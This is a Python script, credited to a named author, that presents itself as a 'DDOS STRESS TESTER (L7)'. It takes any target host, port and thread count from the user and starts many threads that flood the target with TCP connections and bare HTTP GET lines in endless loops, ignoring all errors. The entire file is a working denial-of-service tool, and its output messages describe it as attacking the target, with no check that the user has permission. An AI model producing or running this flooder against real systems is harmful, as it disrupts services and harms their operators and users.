# CREATED BY: RAMIZ UDDIN
import os, time, socket, threading

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

def attack(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.close()
        except:
            pass

def run():
    tool_header("DDOS STRESS TESTER (L7)")
    print("\033[1;32m[*] Multithreaded HTTP Request Flooder.\033[0m")
    
    target = input("\nEnter Target IP/Host: ")
    if not target: return
    port = int(input("Port (default 80): ") or 80)
    threads = int(input("Threads (default 100): ") or 100)
    
    print(f"\n\033[1;31m[!] Attacking {target}:{port} with {threads} threads...\033[0m")
    print("[!] Press Ctrl+C multiple times to force stop or exit Termux.")
    
    for i in range(threads):
        t = threading.Thread(target=attack, args=(target, port))
        t.daemon = True
        t.start()
        
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Attack Stopped.\033[0m")
        
    input("\n[Press Enter to Return]")

if __name__ == "__main__":
    run()
